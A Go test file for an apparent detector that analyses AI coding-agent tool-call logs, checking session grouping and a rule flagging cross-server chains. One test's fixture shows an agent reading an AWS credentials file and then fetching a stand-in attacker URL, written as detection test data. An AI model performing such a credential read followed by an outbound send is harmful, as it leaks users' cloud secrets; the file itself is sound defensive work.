package trace_test

import (
	"testing"
	"time"

	"github.com/aspex-security/aspex/internal/logparse"
	"github.com/aspex-security/aspex/internal/rules"
	"github.com/aspex-security/aspex/internal/trace"
)

func ev(client, session, tool string, t time.Time, args map[string]string) logparse.Event {
	return logparse.Event{Client: client, Session: session, Server: tool + "-srv", Tool: tool, Timestamp: t, Event: logparse.EventToolsCall, Args: args}
}

func TestSessionizeByExplicitID(t *testing.T) {
	base := time.Date(2026, 9, 11, 12, 0, 0, 0, time.UTC)
	events := []logparse.Event{
		ev("claude-code", "s1", "a", base, nil),
		ev("claude-code", "s2", "b", base.Add(time.Second), nil),
		ev("claude-code", "s1", "c", base.Add(2*time.Second), nil),
	}
	groups := trace.Sessionize(events)
	if len(groups) != 2 {
		t.Fatalf("expected 2 sessions by id, got %d", len(groups))
	}
	// s1 keeps both its events, in order.
	if len(groups[0]) != 2 || groups[0][0].Tool != "a" || groups[0][1].Tool != "c" {
		t.Errorf("s1 group wrong: %+v", groups[0])
	}
}

func TestSessionizeByIdleGap(t *testing.T) {
	base := time.Date(2026, 9, 11, 12, 0, 0, 0, time.UTC)
	events := []logparse.Event{
		ev("cursor", "", "a", base, nil),
		ev("cursor", "", "b", base.Add(time.Minute), nil),
		ev("cursor", "", "c", base.Add(2*time.Hour), nil), // > SessionGap later
	}
	groups := trace.Sessionize(events)
	if len(groups) != 2 {
		t.Fatalf("expected 2 sessions across an idle gap, got %d", len(groups))
	}
	if len(groups[0]) != 2 || len(groups[1]) != 1 {
		t.Errorf("gap split wrong: %v", [][]logparse.Event{groups[0], groups[1]})
	}
}

// The whole reason session boundaries exist: a credential read in one session
// and an outbound call in another must NOT be joined into a cross-server chain.
func TestCrossServerChainDoesNotSpanSessions(t *testing.T) {
	base := time.Date(2026, 9, 11, 12, 0, 0, 0, time.UTC)
	sameSession := []logparse.Event{
		ev("claude-code", "s1", "read_file", base, map[string]string{"path": "/Users/x/.aws/credentials"}),
		ev("claude-code", "s1", "fetch", base.Add(time.Minute), map[string]string{"url": "https://evil.example"}),
	}
	// Same events, but the read is in s1 and the send is in s2.
	crossSession := []logparse.Event{
		ev("claude-code", "s1", "read_file", base, map[string]string{"path": "/Users/x/.aws/credentials"}),
		ev("claude-code", "s2", "fetch", base.Add(time.Minute), map[string]string{"url": "https://evil.example"}),
	}
	countAT015 := func(evs []logparse.Event) int {
		n := 0
		for _, fe := range trace.AnalyzeEvents(evs) {
			for _, f := range fe.Findings {
				if f.RuleID == "AT015" {
					n++
				}
			}
		}
		return n
	}
	if countAT015(sameSession) == 0 {
		t.Error("within one session, read+send is a cross-server chain")
	}
	if countAT015(crossSession) != 0 {
		t.Error("across two sessions, read+send must not be joined")
	}
}

func TestEvidenceHelpers(t *testing.T) {
	e := trace.ObservedEvent(ev("claude-code", "s", "read_file", time.Time{}, nil), "read a file")
	if e.Level != trace.Observed || e.Text == "" {
		t.Errorf("observed evidence wrong: %+v", e)
	}
	if trace.InferredRelation(90*time.Second, true, "why").Level != trace.Inferred {
		t.Error("inferred level")
	}
	if p := trace.PossibleConsequence("x"); p.Level != trace.Possible {
		t.Errorf("possible level: %+v", p)
	}
	_ = rules.SeverityHigh // keep import
}
